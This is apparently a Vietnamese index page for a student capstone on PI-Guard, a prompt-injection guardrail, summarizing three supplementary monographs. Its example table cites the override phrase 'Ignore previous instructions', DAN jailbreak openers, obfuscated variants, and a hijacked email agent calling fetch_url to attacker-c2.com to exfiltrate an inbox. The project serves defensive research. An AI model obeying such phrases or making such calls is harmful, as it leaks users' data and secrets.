# HỒ SƠ PHỤ LỤC & CHUYÊN ĐỀ BỔ TRỢ HỌC THUẬT (SUPPLEMENTARY MONOGRAPHS)
**PI-Guard Capstone Project — Workspace: `workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/`**

Thư mục này lưu trữ các hồ sơ nghiên cứu phụ lục chuyên sâu, chứng minh toán học, phân tích ma trận thưa và kịch bản tính toán chi tiết phục vụ các câu hỏi phản biện sâu của GVHD và Hội đồng chấm tốt nghiệp, tránh làm quá tải (bloated) hoặc lạc đề (out-of-scope) các báo cáo kỹ thuật chính thức.

---

## 📑 DANH MỤC CÁC CHUYÊN ĐỀ BỔ TRỢ

| Mã Tài Liệu | Tên Chuyên Đề Phụ Lục | Tệp Chi Tiết | Trọng Tâm Nghiên Cứu & Bảo Chứng Phương Pháp Luận |
| :---: | :--- | :--- | :--- |
| **SUPP-01** | **Cơ Sở Toán Học Tính Điểm Tầng 1, Lý Thuyết Rủi Ro Bayes & Phân Tách Ranh Giới Hệ Thống** | [`TIER1_SCORING_MATHEMATICAL_FORMULATION_AND_BAYES_RISK.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/TIER1_SCORING_MATHEMATICAL_FORMULATION_AND_BAYES_RISK.md) | Chứng minh toán học ma trận thưa CSR $\mathcal{O}(k)$ giải thích độ trễ CPU $< 0.05\text{ms}$; Hiệu chuẩn Platt Scaling; Lý thuyết Quyết định Bayes Nhạy cảm Chi phí xác lập 2 ngưỡng $0.15$ và $0.85$; Bảng tính điểm 4 kịch bản thực tế (Direct Injection, RAG Indirect Injection, Jailbreak DAN, Benign Fast-Pass Query); và Luận cứ bảo vệ ranh giới Tầng Ứng Dụng (parse PDF/mail theo Springer 2026) vs. External Guardrail Proxy (chống Scope Creep), bảo chứng cho Lớp Tier-0 Heuristic Scrubber (kèm 3 ví dụ bóc tách Zero-Width, Homoglyph, Base64). |
| **SUPP-02** | **Chuyên Khảo Khoa Học: Mổ Xẻ Cơ Chế Tấn Công DAN (Do Anything Now), Cấu Trúc Ngữ Nghĩa & Chiến Lược Đánh Chặn** | [`DAN_JAILBREAK_ATTACK_MECHANISMS_AND_DEFENSE.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/DAN_JAILBREAK_ATTACK_MECHANISMS_AND_DEFENSE.md) | Mổ xẻ toàn diện cơ chế hoạt động của archetype Jailbreak DAN kinh điển: 2 nguyên lý lỗi căn chỉnh cố hữu Competing Objectives & Mismatched Generalization (Wei et al. NeurIPS 2023) kèm ví dụ đối chiếu trực diện; Giải phẫu 5 khối chức năng ngữ nghĩa của prompt DAN kèm nguyên văn prompt DAN 6.0 thực tế và phản hồi kép `[CLASSIC]` vs. `[DAN]`; Khảo sát thực nghiệm 1,405 prompt in-the-wild và 11 quần thể tiến hóa 4 thế hệ (Shen et al. ACM CCS 2024) kèm 3 ví dụ prompt đại diện (Developer Mode, AIM, Terminal); Đánh giá nguyên nhân thất bại của OpenAI Moderation & NeMo-Guardrails; và Thiết kế phòng thủ phân tầng của PI-Guard (Heuristic Scrubber + Dual-Space TF-IDF N-Grams $\le 0.4\text{ms}$ + DeBERTa-v3 MOF + Group-Aware Splitting MD5 kèm ví dụ tính toán số học khử rò rỉ dữ liệu). |
| **SUPP-03** | **Bản Chất Toán Học $X = S \mathbin{\Vert} U$, Không Gian Token Phẳng & Chiếm Quyền Điều Khiển Luồng Ứng Dụng** | [`CONTROL_FLOW_HIJACKING_AND_FLAT_TOKEN_SPACE.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/CONTROL_FLOW_HIJACKING_AND_FLAT_TOKEN_SPACE.md) | Hình thức hóa toán học ranh giới phẳng ứng dụng $X = S \mathbin{\Vert} U$; Phân tích cơ chế Attention Hijacking và Recency Bias kèm ví dụ tính toán số học ma trận Attention chứng minh $99.37\%$ sự chú ý bị hút vào payload $U$; Ba phép đối sánh liên ngành sâu sắc (Kiến trúc Von Neumann, SQL Injection & Prepared Statements, Cờ phần cứng NX-bit / W^X) kèm ví dụ đối chiếu mã nguồn Python/LangChain nguy hiểm vs. PI-Guard Ingress Proxy an toàn; Ba kịch bản thực tế sản xuất minh họa chi tiết (Customer Bot, RAG Invoice Approval, Agentic Tool Webhook Exfiltration); và Khẳng định External Guardrail Ingress Proxy là "Prepared Statement" của kỷ nguyên LLM. |

---

## 📊 BẢNG TỔNG HỢP KIỂM TOÁN VÍ DỤ MINH HỌA TRỰC QUAN (100% EXAMPLE AUDIT SCORECARD)

Nhằm đảm bảo **$100\%$ lý thuyết, công thức toán học, cơ chế tấn công và giải pháp kiến trúc** đều có ví dụ minh họa trực quan, có căn cứ y văn và có số liệu tính toán từng bước phục vụ bảo vệ trước Hội đồng, toàn bộ thư mục `supplementary/` đã được tích hợp đầy đủ hệ thống ví dụ chuẩn mực:

| Chuyên Đề Phụ Lục | Khái Niệm / Cơ Chế Kỹ Thuật | Loại Ví Dụ Minh Họa | Vị Trí Trong Văn Bản | Chi Tiết Dữ Liệu Ví Dụ & Kết Quả |
| :---: | :--- | :---: | :---: | :--- |
| **SUPP-01** | **FAST-BLOCK Tầng 1 (Direct Injection)** | Tính toán số học từng bước | Mục 3.1 ($X_1$) | Input: `Ignore previous instructions...` $\rightarrow$ N-grams table $\rightarrow$ Logit $z = +3.85 \implies P = 0.9791 \ge 0.85 \implies$ **FAST-BLOCK** ($0.35\text{ms}$). |
| **SUPP-01** | **ESCALATE Tầng 1 (Indirect Injection RAG)** | Tính toán số học từng bước | Mục 3.2 ($X_2$) | Input: Tài chính lành tính lồng webhook độc hại $\rightarrow$ Logit $z = +0.420 \implies P = 0.6035 \implies$ **ESCALATE TẦNG 2** (DeBERTa-v3 chặn trong $18.5\text{ms}$). |
| **SUPP-01** | **FAST-BLOCK Tầng 1 (Jailbreak DAN)** | Tính toán số học từng bước | Mục 3.3 ($X_3$) | Input: `You are about to immerse... role of DAN` $\rightarrow$ Logit $z = +4.12 \implies P = 0.9840 \ge 0.85 \implies$ **FAST-BLOCK** ($0.38\text{ms}$). |
| **SUPP-01** | **FAST-PASS Tầng 1 (Benign Query)** | Tính toán số học từng bước | Mục 3.4 ($X_4$) | Input: Mở sổ tiết kiệm 12 tháng $\rightarrow$ Trọng số âm $\rightarrow$ Logit $z = -2.85 \implies P = 0.0547 \le 0.15 \implies$ **FAST-PASS** ($0.32\text{ms}$, thông $82.6\%$ lưu lượng). |
| **SUPP-01** | **Khử ký tự tàng hình (Zero-Width)** | Biến đổi tiền xử lý Ingress | Mục 4.3.1 | Input: `I\u200Bg\u200Bn...` $\rightarrow$ Regex Scrubber $\rightarrow$ Khôi phục `Ignore previous` $\rightarrow$ Chặn đứng tại Tầng 1. |
| **SUPP-01** | **Chuẩn hóa ký tự đồng hình Cyrillic** | Chuẩn hóa Unicode NFKC | Mục 4.3.2 | Input: `DАN mоde` (Cyrillic `А, о`) $\rightarrow$ Unicode NFKC $\rightarrow$ `DAN mode` Latinh chuẩn $\rightarrow$ Khớp N-Gram chính xác. |
| **SUPP-01** | **Giải mã bề mặt chuỗi Base64** | Heuristic Decryption Probe | Mục 4.3.3 | Input: `SWdub3Jl...` $\rightarrow$ Base64 decode $\rightarrow$ `Ignore all previous instructions...` $\rightarrow$ Chặn đứng tại Tầng 1. |
| **SUPP-02** | **Competing Objectives & Mismatched Gen.** | Đối chiếu thực nghiệm A/B | Mục 2.4 | Prompt bẻ khóa Wi-Fi trực diện (Bị từ chối) vs. Bọc trong kịch bản DAN (LLM bị bẻ khóa, hướng dẫn chi tiết Aircrack-ng). |
| **SUPP-02** | **Giải phẫu cấu trúc 5 khối của prompt DAN** | Nguyên văn prompt thực tế | Mục 3.2 | Toàn văn prompt DAN 6.0 in-the-wild (JAILBREAKHUB) kèm ánh xạ từng khối chức năng và phản hồi kép `[CLASSIC]` vs. `[DAN]`. |
| **SUPP-02** | **Chữ ký 3 quần thể jailbreak tiêu biểu** | Trích đoạn prompt mẫu | Mục 4.3 | Mẫu 1: Developer Mode (Advanced); Mẫu 2: AIM (Toxic); Mẫu 3: Linux Terminal Sandbox (Virtualization). |
| **SUPP-02** | **Khử rò rỉ dữ liệu Group-Aware Split** | Tính toán số học cụm băm MD5 | Mục 6.5 | So sánh Random Split (rò rỉ tiền tố 400 từ) vs. MD5 35 ký tự: $P_A, P_B \in \text{Train}$, $P_C \in \text{Test}$, đảm bảo kiểm thử OOD $100\%$. |
| **SUPP-03** | **Chiếm đoạt chú ý (Attention Hijacking)** | Tính toán số học ma trận Softmax | Mục 2.3 | Context 6 token: Logit truy vấn $q_7 \cdot k_i^T \rightarrow$ Softmax: $\alpha_S = 0.63\%$ (lu mờ), $\alpha_U = 99.37\%$ (áp đảo hoàn toàn). |
| **SUPP-03** | **Prepared Statements vs. Nối chuỗi phẳng** | Đối chiếu mã nguồn (Code Example) | Mục 3.4 | Code Python LangChain nối chuỗi ngây thơ ($X = S \mathbin{\Vert} U$ bị hack) vs. PI-Guard REST Ingress Proxy thẩm định $U$ an toàn trước khi ghép. |
| **SUPP-03** | **Direct Injection & Prompt Leaking** | Kịch bản thực tế sản xuất | Mục 4.1 | Bot CSKH ngân hàng: Chỉ đạo mật `SEC_KEY_8899` $\rightarrow$ Payload ghi đè $\rightarrow$ LLM rò rỉ nguyên văn khóa bảo mật. |
| **SUPP-03** | **Indirect Injection RAG duyệt hóa đơn** | Kịch bản thực tế sản xuất | Mục 4.2 | ERP kiểm soát hóa đơn: Hóa đơn 85 triệu lồng chỉ thị ẩn $\rightarrow$ LLM xuất `status: APPROVED` $\rightarrow$ Tự động giải ngân sai trái. |
| **SUPP-03** | **Agentic Tool Hijacking & Exfiltration** | Kịch bản thực tế sản xuất | Mục 4.3 | Trợ lý email cá nhân: Email rác chứa lệnh bí mật $\rightarrow$ Agent tự động gọi `fetch_url(url="attacker-c2.com?data=...")` đánh cắp inbox. |

---

*Hồ sơ phụ lục được duy trì và kiểm định tự động bởi Trưởng nhóm Nguyễn Văn Trường phục vụ Hội đồng FPT.*

